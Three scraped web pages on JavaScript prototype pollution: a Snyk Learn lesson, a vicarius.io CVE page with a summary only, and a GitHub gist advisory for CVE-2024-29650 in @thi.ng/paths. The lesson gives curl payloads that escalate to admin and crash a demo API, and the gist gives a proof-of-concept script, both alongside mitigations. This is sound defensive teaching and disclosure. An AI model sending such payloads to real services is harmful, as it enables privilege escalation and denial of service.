=== Content from learn.snyk.io_cb90c0d3_20250111_180118.html ===

We're sorry but Snyk Learn doesn't work properly without JavaScript
enabled. Please enable it to continue.

[Learn](/)

* Browse topics

Login[Sign up](https://api.snyk.io/v1/learn/auth?cta=signup&page=learn-lesson&loc=nav&learn_redirect_path=%2Flesson%2Fprototype-pollution%2F)[Learn](/)

* Browse topicsBy type
  + [Security education](/catalog/security-education)
  + [Product training](/catalog/product-training)By format
  + [Lesson](/catalog/?format=lesson)
  + [Learning path](/catalog/?format=learning_path) [View all](/catalog/)
Login

SNYK LEARN LOGIN

* [ð Snyk (recommended)](https://api.snyk.io/v1/learn/auth?cta=login&page=learn-lesson&loc=nav&learn_redirect_path=%2Flesson%2Fprototype-pollution%2F "Snyk (recommended)")

OTHER REGIONS

For Snyk Enterprise customers with regional contracts.  [More info](https://docs.snyk.io/working-with-snyk/regional-hosting-and-data-residency "regional hosting contracts")

* [ðªðº Snyk EU](https://api.eu.snyk.io/v1/learn/auth?cta=login&page=learn-lesson&loc=nav&learn_redirect_path=%2Flesson%2Fprototype-pollution%2F "Snyk EU")
* [ð¦ðº Snyk AUS](https://api.au.snyk.io/v1/learn/auth?cta=login&page=learn-lesson&loc=nav&learn_redirect_path=%2Flesson%2Fprototype-pollution%2F "Snyk AUS")
* [ðºð¸ Snyk US](https://api.us.snyk.io/v1/learn/auth?cta=login&page=learn-lesson&loc=nav&learn_redirect_path=%2Flesson%2Fprototype-pollution%2F "Snyk US")
[Sign up](https://api.snyk.io/v1/learn/auth?cta=signup&page=learn-lesson&loc=nav&learn_redirect_path=%2Flesson%2Fprototype-pollution%2F)

2. [Snyk Learn](/) /
3. [Lessons](/catalog/?format=lesson) /
4. [Prototype pollution](/lesson/prototype-pollution/)
# Prototype pollution

## Exposing the default prototype by calling unsafe recursive functions with untrusted data as input

### JavaScript

## Prototype pollution: the basics

Copy to Clipboard
### What is prototype pollution?

Prototype pollution is an injection attack that targets JavaScript runtimes. With prototype pollution, an attacker might control the default values of an object's properties. This allows the attacker to tamper with the logic of the application and can also lead to denial of service or, in extreme cases, remote code execution.

After reading the above definition, there are probably at least a dozen questions that spring to mind. What does it actually mean to âoverride object attributes at runtimeâ? How can it affect the [security of my application](https://snyk.io/learn/application-security/?loc=learn)? And, most importantly, how do I protect my code against this attack?

### About this lesson

Prototype pollution can be complex, so we will walk through it in three steps.

1. You will use prototype pollution to compromise a vulnerable API
2. You will learn more about JavaScript prototypes and how prototype pollution works
3. And, you will learn how to fix and prevent prototype pollution in your applications
FUN FACT
### Not an isolated case

Prototype pollution vulnerabilities have been found and fixed in many popular JavaScript libraries, including [jQuery](https://snyk.io/vuln/SNYK-JS-JQUERY-174006/?loc=learn), [lodash](https://snyk.io/vuln/SNYK-JS-LODASH-450202), [express](https://snyk.io/vuln/SNYK-JS-EXPRESSFILEUPLOAD-595969), [minimist](https://snyk.io/vuln/SNYK-JS-MINIMIST-559764), [hoek](https://snyk.io/vuln/npm%3Ahoek%3A20180212)â¦ and the list goes on. When a prototype pollution vulnerability was discovered in jQuery, jQuery was--at that time--being used in 74% of all websites. Talk about scary!

![](https://res.cloudinary.com/snyk/image/upload/v1642680335/snyk-learn/patchonaut.svg)
## Prototype pollution in action

Copy to Clipboard

Letâs demonstrate how a prototype pollution attack may play out in the real world. A company called startup.io, which we might recognize from the other lessons, finally acquired users for its products. Obliged by .io in its name, startup.io decided to release an API that allows users to manage data the company holds via the app.

Unfortunately, stressed by looming deadlines and chased by ever-demanding stakeholders, startup.io engineers did a bad job of securing their API. They never had time to schedule a meeting with their AppSec team to help with the design and they later ignored all the issues reported by the security scanners. As a result, their API contains many bugs and vulnerabilities--one of which is prototype pollution.

This is obviously bad for startup.io--but good news for us because with it we can compromise their API. Letâs focus on two API endpoints that startup.io exposes:

* An HTTP POST on `https://api.startup.io/users/:userId` that allows updating data for a user with `userId`
* An HTTP GET on `https://api.startup.io/users/:userId/role` that allows retrieving the security role that a given user is currently assigned to (either `admin` or `user`)
### Vulnerable API

Letâs try to escalate our privileges to adminhood by tampering with the application logic. Then, letâs try to bring down the whole API with a denial of service attack.

All examples assume we are already authorized, and any authorization headers are omitted for readability. To interact with the API, we will be using an embedded terminal window like the one below.

Letâs examine how the HTTP POST endpoint works by sending a valid request. We read in the docs that the endpoint allows us to change the text in the âaboutâ section that's displayed on our userâs profile page. We are good at sanitizing database code, so we want our âaboutâ section to say âDatabase sanitization expertâ.

Copy and paste the following into the terminal and hit enter:

`curl -H "Content-Type: application/json" -X POST -d '{"about": "Database sanitization expert"}' https://api.startup.io/users/1337`

We should get a JSON response with the data stored about the user, with the âaboutâ text updated:

{ name: "Robert", surname: "Tables", about: "Database sanitization expert" }

Next, letâs see how the HTTP GET endpoint works by sending another valid request.

Copy and paste the following into the terminal and hit enter:

`curl -X GET https://api.startup.io/users/1337/role`

We should get back JSON with the default role our user is assigned:

`{ role: "user" }`

Demo terminal Reset terminal
### Hacking #1: naive, failed attempt

Now that we know how the API works, letâs see if we can modify our role and set it to `admin`. Try setting the `role` attribute to `admin` directly via a POST request.

Copy and paste the following into the terminal and hit enter:

`curl -H "Content-Type: application/json" -X POST -d '{"role": "admin"}' https://api.startup.io/users/1337 && curl -X GET https://api.startup.io/users/1337/role`

We should get the following output:

`{ role: "user" }`

Alas, this simple approach did not work. The role attribute stubbornly remains set to user. However, our quest to transcend to adminhood is not over yet!

Demo terminal Reset terminal
### Hacking #2: privilege escalation with prototype pollution

Earlier, we discovered that prototype pollution might allow us to override any attribute defined on any object in the application. Perhaps the vulnerability could allow us to change the `role` attribute? Letâs try again--but this time letâs add a magical (for the time being) `__proto__` prefix to the attribute we are setting.

Copy and paste the following into the terminal and hit enter:

`curl -H "Content-Type: application/json" -X POST -d '{"about": {"__proto__": {"role": "admin"}}}' https://api.startup.io/users/1337 && curl -X GET https://api.startup.io/users/1337/role`

And we should get:

`{ role: "admin" }`

BOOM! Weâve successfully managed to elevate ourselves to adminhood by sending a mysterious payload `{"about": {"__proto__": {"role": "admin"}}}` to the backend.

But wait, what is this magical `__proto__` prefix and why did it work? Donât worry, weâll discuss that more in the next section of this lesson. But before we do that, letâs bring this whole buggy API down.

Demo terminal Reset terminal
### Hacking #3: bringing down the whole API

In our previous attack, we managed to change the role attribute to whatever we wanted. But wait, arenât JavaScript functions also stored as attributes on their respective objects? Could we possibly use the same tampering technique to override a function?

Letâs try to override one! What function is likely called by any program written in JavaScript? Well, one of the best candidates is the `toString` function! Letâs try to override the function with something meaningless, maybe a programmer dad joke?

Copy and paste the following into the terminal and hit enter:

`curl -H "Content-Type: application/json" -X POST -d '{"about": {"__proto__": {"toString": "Two bytes meet. The first byte asks: Are you ill? The second byte replies: No, just feeling a bit off."}}}' https://api.startup.io/users/1337`

And we should get as an output:

`500 Internal Server Error`

The API is down. Turns out that we can override a function!

What happened here? We will dive into the code a bit later. For now, we can deduce that we were able to override the `toString` method, just like we did before with the `role` attribute. Whenever the JavaScript runtime invokes `toString()` it expects it to be a method. But, it is no longer a method after our change (it is a dad joke now, i.e. a string literal), so the whole web server crashes, resulting in 500 errors.

Demo terminal Reset terminal
## Prototype pollution under the hood

Copy to Clipboard
### What is a prototype in JavaScript?

To understand why our attacks worked, we need to take a slight detour and explain what JavaScript prototypes are.

When we create an empty object in JavaScript (for example, `const obj = {}`), the created object already has many attributes and methods defined for it, for instance, the `toString` method. Have you ever wondered where all these attributes and methods come from? The answer is the prototype.

Many object-oriented languages, for example Java, use classes as blueprints for object creation. Each object belongs to a class, and classes are organized in parent-child hierarchies. When we call the `toString` method on an object, the language runtime will look for the `toString` method defined on the class a given object belongs to. If it cannot find such a definition, it will look for it in the parent class, then its parent class, until it hits the top of the class hierarchy.

JavaScript, instead, is a prototype-based object-oriented programming language. Each object is linked to a âprototypeâ. When we invoke the `toString` method on an object, JavaScript will first check to see if we explicitly defined the method for the given object. If we havenât, it will look for its definition on the objectâs prototype.

## Just a normal JavaScript object Run code

Under the hood, a prototype of an object is just another JavaScript object and is publicly accessible via the `__proto__` attribute. Run the code sample below:

Code: Run â¶ Output:
## Missing attributes come from the prototype Run code

If we try to access an attribute that doesnât exist on an object, JavaScript will look into the objectâs prototype to get the value for that attribute. To see this, run the code snippet. Even though `a` is an empty object and does not define `someFunction` explicitly, we can still call `someFunction` on `a` after we define the function on the prototype of `a`.

Code: Run â¶ Output:
## The shared default prototype Run code

So, where is the risk associated with prototypes? Well, here comes the critical part. Most objects share the same (default) prototype! For example, all objects created via the literal `{}` or the `new Object()` constructor will share the same prototype unless we explicitly override it. Consider our code snippet. `a` and `b` are unrelated objects, yet their `__proto__` attributes point to the same object.

Code: Run â¶ Output:
## Setting attributes on a shared prototype Run code

What do you think will happen if we start setting or updating the attributes on a shared prototype object? Consider the code snippet. `a and b` have no direct connection but share the same prototype. As a result, changing the prototype of `a` affects `b`!

Code: Run â¶ Output:
### Prototype pollution explained

The bottom line is--if we modify a prototype shared by two or more objects, all objects will reflect this modification! They donât even have to be in the same scope or otherwise related. And remember, most objects by default share the same prototype--so if we change the prototype of just one of these objects, we can change the behaviour of all of them!

What if a malicious person can change (or âpolluteâ) a prototype shared by multiple objects? In fact, this is what we did when we compromised startup.ioâs API in the previous section. Remember, the payloads we sent to the server were:

`{"about": {"__proto__":"{"role": "admin"}}}`

`{"about": {"__proto__": {"toString": "Two bytes meet. The first byte asks: Are you ill? The second byte replies: No, just feeling a bit off."}}}`

We polluted the `role` and `toString` attributes of the default shared prototype object by sending a specially crafted HTTP POST request. To see how that attack worked, consider the code of the GET and POST HTTP request handlers:

![A prototype pollution attack where a hacker sends a malicious payload to the backend server, and an unsafe merge function recursively merges that payload with a backend object](https://images.ctfassets.net/4un77bcsnjzw/Vwzc7KeFf0STZakfXDUjq/9e19303bfdabdba9d161dd134cabfaa8/Prototype_pollution_Attack.svg)

A prototype pollution attack where a hacker sends a malicious payload to the backend server, and an unsafe merge function recursively merges that payload with a backend object

 Previous  Next

The `updateUser` method handles the HTTP POST request. The input `requestBody` is the payload we sent to the server.

## Scan your code & stay secure with Snyk - for FREE!

Did you know you can use Snyk for free to verify that your code
doesn't include this or other vulnerabilities?

[Scan your code](https://app.snyk.io/login?loc=body&page=learn-lesson&cta=login)
## Prototype pollution mitigation

Copy to Clipboard
### Solution: Use safe open source libraries when recursively setting object's properties

The `merge` function that startup.io wrote aimed to update one object with all attributes of another object. As we saw when we toured the code in the last section, the merge function is recursive and merrily merges all properties from its second input--even when it contains untrusted data with dubious keys such as `__proto__`.

Merging two objects is not the only functionality that can expose the code to a prototype pollution attackâany function which recursively sets nested properties can create an attack vector. Other common examples in the JavaScript ecosystem include: deep cloning (e.g. [lodash cloneDeep](https://lodash.com/docs#cloneDeep)), setting nested properties (e.g. [lodash set](https://lodash.com/docs#set)), or creating objects by recursively "zipping" properties with values (e.g. [lodash zipObjectDeep](https://lodash.com/docs#zipObjectDeep)).

Always be sure to sanitize untrusted input when recursively setting nested properties. Donât do this yourself! Even the best developers can easily get this wrong. Instead, use a library such as [lodash](https://lodash.com/), which is extremely popular and has excellent community support and a track record of promptly fixing security issues.

![A prototype pollution mitigation, where a hacker tries to send a malicious input, but a safe merge function is used, preventing the malicious input from affecting the prototype](https://images.ctfassets.net/4un77bcsnjzw/4sljtc6qUAvKrSvgCp9pAs/9fe3be07d0d2037e98ed8b5747ffad6a/Prototype_pollution_Mitigation.svg)

A prototype pollution mitigation, where a hacker tries to send a malicious input, but a safe merge function is used, preventing the malicious input from affecting the prototype

To decide which libraries to trust, use [Snyk Advisor](https://snyk.io/advisor/?loc=learn)! Snyk Advisor provides information on a given package's popularity, community support, and security. Also, check your open source libraries with vulnerability scanners such as [Snyk](https://snyk.io/?loc=learn), which will notify you about all new vulnerabilities discovered in any libraries you are using, and will help you mitigate them easily.

FUN FACT
### It is hard to get right

Mitigating prototype pollution attacks is hard. While implementing a recursive merge function, [lodash](https://lodash.com/) developers made sure a key with the value `__proto__` would not be copied from one object to another. Unfortunately, it later turned out that prototype pollution is also possible through other properties, e.g. `constructor.prototype` ([check this fix commit](https://github.com/lodash/lodash/pull/4336/files) to learn how lodash developers dealt with that issue).

The lesson to learn here is that proper sanitization of user input is extremely hard. Whenever you can, use a battle-tested library to do the work for you.

![](https://res.cloudinary.com/snyk/image/upload/v1642680335/snyk-learn/patchonaut.svg)
### Solution: Create objects without prototypes: Object.create(null)

Another way to avoid prototype pollution is to consider using the `Object.create()` method instead of the object literal `{}` or the object constructor `new Object()` when creating new objects. This way, we can set the prototype of the created object directly via the first argument passed to `Object.create()`. If we pass `null`, the created object will not have a prototype and therefore cannot be polluted.

### Solution: Prevent any changes to the prototype: use Object.freeze()

JavaScript comes with an `Object.freeze()` method, which we can use to prevent any changes to the attributes of an object. Since the prototype is just an object, we can freeze it, too. We can freeze the default prototype by invoking `Object.freeze(Object.prototype)`, which prevents the default prototype from getting polluted.

Alternatevly you can simply install [nopp](https://www.npmjs.com/package/nopp) npm package which freezes all common object prototypes automatically.

### How do you mitigate prototype pollution?

To mitigate prototype pollution vulnerabilities in your codebase use popular open-source libraries when you need to recursively set nested properties on an object. Check which libraries to use with [Snyk Advisor](https://snyk.io/advisor/?loc=learn), and always make sure that the library you choose is free of vulnerabilities with scanners such as [Snyk](https://snyk.io/?loc=learn). To harden your code further, use `Object.create(null)` to avoid using prototypes altogether, or use `Object.freeze(Object.prototype)` to prevent any changes to the shared prototype.

## Quiz

Copy to Clipboard
### Test your knowledge!

### Quiz

Which of the following methods is an effective way to create an object without a prototype in JavaScript, thereby preventing prototype pollution?

new Object()

Object.assign({}, null)

Object.prototype.null

Object.create(null)

[Sign up to take the quiz](https://api.snyk.io/v1/learn/auth?cta=signup&page=learn-lesson&loc=body&learn_redirect_path=%2Flesson%2Fprototype-pollution%2F&learn_redirect_fragment=%23q-bd4cdea7-d999-4a72-8aa7-6dc016b0a91d-22ba9ab1-cb40-4118-296e-9138f021abfd)
### Keep learning

To learn more about prototype pollution, check out our blog posts:

* Read about how our security research team discovered prototype pollution in [lodash](https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/?loc=learn) and [minimist](https://snyk.io/blog/prototype-pollution-minimist/?loc=learn)
* Check out our coverage on prototype pollution findings in [jQuery](https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/?loc=learn) and [express](https://snyk.io/blog/prototype-pollution-in-express-fileupload/?loc=learn)

Finally, if you would like to dive deeper into prototype pollution, be sure to read [this detailed report](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf) on prototype pollution written by Security Researcher, [Olivier Arteau](https://hackerone.com/holyvier?type=user). He has found and responsibly disclosed many prototype pollution vulnerabilities in the most common JavaScript libraries.

## Congratulations

Youâve learned what prototype pollution is and how to protect your applications from it. We hope you will apply your new knowledge wisely and make your code safer. Also, make sure to check out our lessons on other common vulnerabilities.

Prototype pollution[Prototype pollution: the basics](/lesson/prototype-pollution/#step-f648bb69-ffdf-5758-a033-64b532101202 "Go to section prototype pollution: the basics")[Prototype pollution in action](/lesson/prototype-pollution/#step-660a8f1c-a381-4d5c-a9a3-d7572f5871df "Go to section prototype pollution in action")[Prototype pollution under the hood](/lesson/prototype-pollution/#step-082a73b2-21d3-45be-64b8-636acf95703e "Go to section prototype pollution under the hood")[Prototype pollution mitigation](/lesson/prototype-pollution/#step-a0a863a5-fd3a-539f-e1ed-a0769f6c6e3b "Go to section prototype pollution mitigation")[Quiz](/lesson/prototype-pollution/#step-bd4cdea7-d999-4a72-8aa7-6dc016b0a91d "Go to section quiz")
#### Personalize your experience

* Create your profile
* Track your progress
* Get new lesson notifications
[Sign up for free](https://api.snyk.io/v1/learn/auth?cta=signup&page=learn-lesson&loc=sidebar&learn_redirect_path=%2Flesson%2Fprototype-pollution%2F)
## FAQs

What is prototype pollution?

Prototype pollution is an injection attack that targets JavaScript runtimes. With prototype pollution, an attacker might control the default values of an object's properties. This allows the attacker to tamper with the logic of the application and can also lead to denial of service or, in extreme cases, remote code execution.

## What to learn next?

[![javascript Broken object level authorization](https://images.ctfassets.net/4un77bcsnjzw/5cZg4eHNM7asSjZXtqUNqK/77d65e13513f51706ad5e0236d193aab/bola_-_API.svg)NEW
## Broken object level authorization

Learn about broken object level authorization and how APIs tend to expose endpoints. We'll look at examples and mitigations of this vulnerability.JavaScriptPythonJavaC#GoPHPStart learning 0% Completed  Â](/lesson/broken-object-level-authorization/) [![javascript Session persistence after logout](https://images.ctfassets.net/4un77bcsnjzw/3j2VpLmTMTmA3LpL5gyuTx/0103594387c09a93342cce48203e235d/Session.svg)
## Session persistence after logout

Learn about what happens when logging out doesn't invalidate the session. We'll look at an example of this in action!JavaScriptStart learning 0% Completed  Â](/lesson/session-persistence/) [![javascript Insecure default variable initialization](https://images.ctfassets.net/4un77bcsnjzw/5Wdo4KqNlg757HRSNwFXX4/e531b3b36ed18f3935a9d7d407170461/Insecure_defaults.svg)
## Insecure default variable initialization

Learn what insecure default variable initialization is, how to mitigate it, and how to remediate the vulnerability with real-world examples from security experts.JavaScriptStart learning 0% Completed  Â](/lesson/insecure-defaults/) [![Snyk logo](https://res.cloudinary.com/snyk/image/upload/v1642427601/snyk-learn/Frame_1.svg)](https://snyk.io/?loc=learn "Snyk")[Book a demo](https://snyk.io/schedule-a-demo/?cta=schedule-demo/?loc=learn)[Sign up for free](https://api.snyk.io/v1/learn/auth?cta=signup&page=learn-lesson&loc=footer&learn_redirect_path=%2Flesson%2Fprototype-pollution%2F)

---

### Product

* [Snyk Open Source](https://snyk.io/product/open-source-security-management/?loc=learn)
* [Snyk Code](https://snyk.io/product/snyk-code/?loc=learn)
* [Snyk Container](https://snyk.io/product/container-vulnerability-management/?loc=learn)
* [Snyk Infrastructure as Code](https://snyk.io/product/infrastructure-as-code-security/?loc=learn)
* [ASPM Solution](https://snyk.io/solutions/aspm/)
* [Application Security Solution](https://snyk.io/solutions/application-security/)
* [Supply Chain Security Solution](https://snyk.io/solutions/software-supply-chain-security/)
* [Deepcode AI](https://snyk.io/platform/deepcode-ai/)
### Resources

* [Vulnerability DB](https://security.snyk.io/?loc=learn)
* [Snyk OSS Advisor](https://snyk.io/advisor/?loc=learn)
* [Documentation](https://support.snyk.io/hc/en-us/?loc=learn)
* [Disclosed Vulnerabilities](https://security.snyk.io/disclosed-vulnerabilities/?loc=learn)
* [FAQs](https://support.snyk.io/hc/en-us/?loc=learn)
* [Code Checker](https://snyk.io/code-checker/?loc=learn)
* [Audit Services](https://snyk.io/open-source-audit/?loc=learn)
### Company

* [About us](https://snyk.io/about/?loc=learn)
* [Snyk Impact](https://snyk.io/about/snyk-impact/?loc=learn)
* [Customers](https://snyk.io/customers/?loc=learn)
* [Jobs at Snyk](https://snyk.io/careers/?loc=learn)
* [Policies](https://snyk.io/policies/terms-of-service/?loc=learn)
* [Do Not Sell My Personal Information](https://preferences.snyk.io/dont_sell/?loc=learn)
### Connect

* [Blog](https://snyk.io/blog/?loc=learn)
* [Security Fundamentals](https://snyk.io/learn/?loc=learn)
* [Security Series](http://snyk.io/series/?loc=learn)
* [Support](https://support.snyk.io/hc/en-us/?loc=learn)
* [Press Kit](https://snyk.io/press-kit/?loc=learn)
* [Events](https://snyk.io/events/?loc=learn)
* [Report a new vuln](https://snyk.io/vulnerability-disclosure/?loc=learn)
### Topics

* [Security Education](/catalog/security-education/)
* [Product Training](/catalog/product-training/)
* [Learning Paths](/catalog/?format=learning_path)
### [Snyk | Open Source Security Platform](https://snyk.io/?loc=learn "Snyk | Open Source Security Platform")

* Snyk is an open source security platform designed to help software-driven businesses enhance developer security. Snyk's dependency scanner makes it the only solution that seamlessly and proactively finds, prioritizes and fixes vulnerabilities and license violations in open source dependencies and container images.

### Track our development

* [![Github's Logo](/assets/images/footer-github-icon.svg)](https://github.com/Snyk/ "Github")
* [![Node Package Manger's Logo](/assets/images/footer-npm-icon.svg)](https://www.npmjs.com/snyk "NPM")
* [![DevSecOps Community Podcast](https://res.cloudinary.com/snyk/image/upload/v1632399229/snyk-learn/community-banner-footer.svg)](https://www.devseccon.com/the-secure-developer-podcast/ "DevSecOps Community Podcast")
* [![Twitter's Logo](/assets/images/footer-twitter-icon.svg)](https://twitter.com/snyksec "Twitter")
* [![Youtube's Logo](/assets/images/footer-youtube-icon.svg)](https://www.youtube.com/channel/UCh4dJzctb0NhSibjU-e2P6w "Youtube")
* [![Facebook's Logo](/assets/images/footer-facebook-icon.svg)](https://www.facebook.com/snyksec "Facebook")
* [![LinkedIn's Logo](/assets/images/footer-linkedin-icon.svg)](https://www.linkedin.com/company/snyk "LinkedIn")

Â© 2025 Snyk Limited
 Registered in England and Wales | Company number: 09677925
 Registered address: Highlands House, Basingstoke Road, Spencers Wood, Reading, Berkshire, RG7 1NT.

![Footer Wave Bottom](https://res.cloudinary.com/snyk/image/upload/snyk-learn/wave-footer.svg)



=== Content from www.vicarius.io_ecd26083_20250111_180119.html ===


 [about](/vsociety/about) [by vicarius](https://vicarius.io/) [log in](/vsociety/sign/in) [join community](/vsociety/sign/up)

* [scripts](/vsociety/posts)
* [CVEs](/vsociety/vulnerabilities)
* [apps](/vsociety/products)
* [OS](/vsociety/operating-systems)

 [by @secatgourity](/vsociety/users/secatgourity)21 Apr 2024030241#cve\_analysis

Write a blog analysis for a CVE

[publish](/vsociety/sign/in)see all related posts
# Unwinding CVE-2024-29650 - A tale of Javascript source-code review to unravel the mysterious prototype pollution amid of loose defenses!

 [by @secatgourity](/vsociety/users/secatgourity)03 [by @secatgourity](/vsociety/users/secatgourity)21 Apr 2024030241#cve\_analysis

Write a blog analysis for a CVE

[publish](/vsociety/sign/in)see all related posts
# Unwinding CVE-2024-29650 - A tale of Javascript source-code review to unravel the mysterious prototype pollution amid of loose defenses!

CVEs

[CVE-2024-29650](/vsociety/vulnerabilities/cve-2024-29650)9.8 Critical Severity
## Screenshots from the blog posts

![images/clv6ynlrwuxrt1imx33ejgt2i.jpg](data:image/svg+xml;charset=UTF-8...)![images/clv6ynlrwuxrt1imx33ejgt2i.jpg](data:image/svg+xml;charset=UTF-8...)
## Summary

The `@thi.ng/paths` package versions <= `5.1.62` are vulnerable to prototype pollution via `mutIn` and `mutInManyUnsafe` functions. An attacker can manipulate the prototype of an object, potentially leading to the alteration of the behavior of all objects inheriting from the affected prototype by passing specially crafted input to these functions. In this post, we see the vulnerability in action and understand the underlying root cause and the fixes for this issue. In this explorative journey, we learn the skill of reading Javascript and some of its funky and weird expressions (syntactic sugar), giving us a taste of source-code review, in a more practical sense!

## Description

Tags

[#trendingCVE](/vsociety/search?hashtags=trendingcve)[#open-source](/vsociety/search?hashtags=open-source)[#nodejs](/vsociety/search?hashtags=nodejs)[#code-review](/vsociety/search?hashtags=code-review)[#prototype-pollution](/vsociety/search?hashtags=prototype-pollution)[@secatgourity](/vsociety/users/secatgourity)

190 posts

subscribe to user

Total vcoins

123.8K

Social media links

Shivambathla

show more

 remediate more CVEs with vRx  [explore more](https://www.vicarius.io/?utm_source=vsociety&utm_medium=organic&utm_campaign=cve_scripts%26analysis) Comments (0)submitshow 5 more replies[@secatgourity](/vsociety/users/secatgourity)

190 posts

subscribe to user

Total vcoins

123.8K

Share

Social media links

Shivambathla

show more

CVEs

[CVE-2024-29650](/vsociety/vulnerabilities/cve-2024-29650)9.8 Critical Severity

Tags

[#trendingCVE](/vsociety/search?hashtags=trendingcve)[#open-source](/vsociety/search?hashtags=open-source)[#nodejs](/vsociety/search?hashtags=nodejs)[#code-review](/vsociety/search?hashtags=code-review)[#prototype-pollution](/vsociety/search?hashtags=prototype-pollution)

Democratizing infosec research for a more secure society. Be a part of the movement.

##### about

* [An Origin Story: vsociety](/vsociety/posts/an-origin-story-vsociety)
* [Frequently Asked Questions](/vsociety/faq)
##### be Part

* [Join Community](/vsociety/sign/up)
* [Login](/vsociety/sign/in)
##### legal

* [Privacy Policy](/vsociety/privacy-policy)
* [Terms of Use](/vsociety/terms)

Copyright © Vicarius 2022. [Privacy Policy](https://www.vicarius.io/privacy) and [Terms of Use](/vsociety/terms)



=== Content from gist.github.com_0993399b_20250111_180117.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Ftariqhawis%2F1bc340ca5ea6ae115c9ab9665cfd5921)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Ftariqhawis%2F1bc340ca5ea6ae115c9ab9665cfd5921&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Ftariqhawis%2F1bc340ca5ea6ae115c9ab9665cfd5921) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Ftariqhawis%2F1bc340ca5ea6ae115c9ab9665cfd5921&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@tariqhawis](https://avatars.githubusercontent.com/u/6041901?s=64&v=4)](/tariqhawis)

# [tariqhawis](/tariqhawis)/**[CVE-2024-29650.md](/tariqhawis/1bc340ca5ea6ae115c9ab9665cfd5921)**

Last active
May 18, 2024 02:33

Show Gist options

* [Download ZIP](/tariqhawis/1bc340ca5ea6ae115c9ab9665cfd5921/archive/7c44fe91c8fec0372abf08f3e402d8db87bc0291.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Ftariqhawis%2F1bc340ca5ea6ae115c9ab9665cfd5921)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Ftariqhawis%2F1bc340ca5ea6ae115c9ab9665cfd5921)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/tariqhawis/1bc340ca5ea6ae115c9ab9665cfd5921.js&quot;&gt;&lt;/script&gt;
* Save tariqhawis/1bc340ca5ea6ae115c9ab9665cfd5921 to your computer and use it in GitHub Desktop.

[Code](/tariqhawis/1bc340ca5ea6ae115c9ab9665cfd5921)
[Revisions
5](/tariqhawis/1bc340ca5ea6ae115c9ab9665cfd5921/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/tariqhawis/1bc340ca5ea6ae115c9ab9665cfd5921.js&quot;&gt;&lt;/script&gt;

Save tariqhawis/1bc340ca5ea6ae115c9ab9665cfd5921 to your computer and use it in GitHub Desktop.

[Download ZIP](/tariqhawis/1bc340ca5ea6ae115c9ab9665cfd5921/archive/7c44fe91c8fec0372abf08f3e402d8db87bc0291.zip)

(CVE-2024-29650) Prototype Pollution vulnerability affecting @thi.ng/paths module, versions <=5.1.62

 [Raw](/tariqhawis/1bc340ca5ea6ae115c9ab9665cfd5921/raw/7c44fe91c8fec0372abf08f3e402d8db87bc0291/CVE-2024-29650.md)

[**CVE-2024-29650.md**](#file-cve-2024-29650-md)

## Overview

Affected versions of this package (<=5.1.62) are vulnerable to prototype pollution via `mutIn` and `mutInManyUnsafe`
An attacker can manipulate the prototype of an object, potentially leading to the alteration of behavior of all objects inheriting from the affected prototype by passing specially crafted input to these functions.

In the PoC code below, paths.mutIn invoked with a polluted `__proto__` property, this property passed as an argument from mutIn() in mut-in.js to defMutator() in mutator.js and then assigned to the destination as follows:

```
        return s ? (t = s[a]) ? (t[b] = x, s) : void 0 : void 0;
```

**Call Stack:**

```
t (@thi.ng/paths/mutator.js:15)
Module.mutIn (@thi.ng/paths/mut-in.js:4)

```
## Attack Vector

A vulnerability occurred when the properties of the source were assigned to the destination without verifying the content of the property and whether it belonged to the object. An attacker can exploit this vulnerability by using user-controllable input to provide the method with a malicious property through the special properties `__proto__` or `constructor.prototype` of the built-in Object.prototype. As a result, the attacker can manipulate the application logic, which could lead to Denial of Service, remote code execution, or privilege escalation attacks.

## PoC:

```
(async () => {
  const lib = await import('@thi.ng/paths');

var victim = {}
console.log("Before Attack: ", JSON.stringify(victim.__proto__));
try {
// Un-comment on at a time
paths.mutIn({},[["__proto__"], "polluted"], true)
paths.mutInManyUnsafe({},[["__proto__"], "polluted"], true)
} catch (e) { }
console.log("After Attack: ", JSON.stringify(victim.__proto__));
delete Object.prototype.polluted;
})();
```

Output:

```
Before Attack:  {}
After Attack:  {"polluted":true}
```

Output of a successful fix:

```
Before Attack:  {}
After Attack:  {}
```

## Mitigation

Upgrade the package version to 5.1.63 or newer.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Ftariqhawis%2F1bc340ca5ea6ae115c9ab9665cfd5921)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


